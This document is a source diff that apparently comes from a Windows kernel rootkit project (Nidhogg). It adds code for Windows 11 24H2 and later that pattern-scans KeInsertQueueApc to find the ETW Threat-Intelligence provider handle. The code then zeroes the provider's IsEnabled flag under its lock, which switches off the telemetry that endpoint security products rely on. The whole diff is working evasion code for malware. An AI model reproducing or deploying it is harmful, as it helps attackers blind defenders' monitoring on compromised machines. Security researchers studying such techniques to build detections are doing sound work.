@@ -48,6 +48,54 @@ NTSTATUS AntiAnalysis::EnableDisableEtwTI(bool enable) {
 	SIZE_T bytesWritten = 0;
 	SIZE_T etwThreatIntProvRegHandleSigLen = sizeof(EtwThreatIntProvRegHandleSignature1);
 
+#if defined(WIN_11_24H2) || 1 // add runtime check for 24H2 and above
+	if (WindowsBuildNumber >= WIN_11_24H2) {
+		// For 24H2 and above, dynamically resolve the EtwThreatIntProvRegHandle address via pattern scan (may work for older versions?)
+		PUCHAR etwThreatIntProvRegHandle = nullptr;
+		UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"KeInsertQueueApc");
+		PVOID searchedRoutineAddress = MmGetSystemRoutineAddress(&routineName);
+		if (!searchedRoutineAddress)
+			return STATUS_NOT_FOUND;
+
+		// Scan first 0x100 bytes for mov r10, qword ptr [rip+rel32] (opcode: 4C 8B 15 ?? ?? ?? ??)
+		PUCHAR scanStart = (PUCHAR)searchedRoutineAddress;
+		PUCHAR scanEnd = scanStart + 0x100;
+		for (PUCHAR p = scanStart; p < scanEnd - 7; ++p) {
+			if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0x15) {
+				// Found: 4C 8B 15 xx xx xx xx
+				INT32 rel = *(INT32*)(p + 3);
+				etwThreatIntProvRegHandle = p + 7 + rel;
+				break;
+			}
+		}
+		if (!etwThreatIntProvRegHandle)
+			return STATUS_NOT_FOUND;
+
+		ULONG enableProviderInfoOffset = GetEtwProviderEnableInfoOffset();
+		if (enableProviderInfoOffset == (ULONG)STATUS_UNSUCCESSFUL)
+			return STATUS_UNSUCCESSFUL;
+		PTRACE_ENABLE_INFO enableProviderInfo = (PTRACE_ENABLE_INFO)(etwThreatIntProvRegHandle + EtwGuidEntryOffset + enableProviderInfoOffset);
+		ULONG lockOffset = GetEtwGuidLockOffset();
+		if (lockOffset != (ULONG)STATUS_UNSUCCESSFUL) {
+			etwThreatIntLock = (EX_PUSH_LOCK)(etwThreatIntProvRegHandle + EtwGuidEntryOffset + lockOffset);
+			ExAcquirePushLockExclusiveEx(&etwThreatIntLock, 0);
+		}
+		if (enable) {
+			status = MmCopyVirtualMemory(PsGetCurrentProcess(), &this->PrevEtwTiValue, PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, sizeof(ULONG), KernelMode, &bytesWritten);
+			if (NT_SUCCESS(status))
+				this->PrevEtwTiValue = 0;
+		} else {
+			ULONG disableEtw = 0;
+			status = NidhoggMemoryUtils->KeReadProcessMemory(PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, &this->PrevEtwTiValue, sizeof(ULONG), KernelMode);
+			if (NT_SUCCESS(status))
+				status = MmCopyVirtualMemory(PsGetCurrentProcess(), &disableEtw, PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, sizeof(ULONG), KernelMode, &bytesWritten);
+		}
+		if (etwThreatIntLock)
+			ExReleasePushLockExclusiveEx(&etwThreatIntLock, 0);
+		return status;
+	}
+#endif
+
 	// Getting the location of KeInsertQueueApc dynamically to get the real location.
 	UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"KeInsertQueueApc");
 	PVOID searchedRoutineAddress = MmGetSystemRoutineAddress(&routineName);
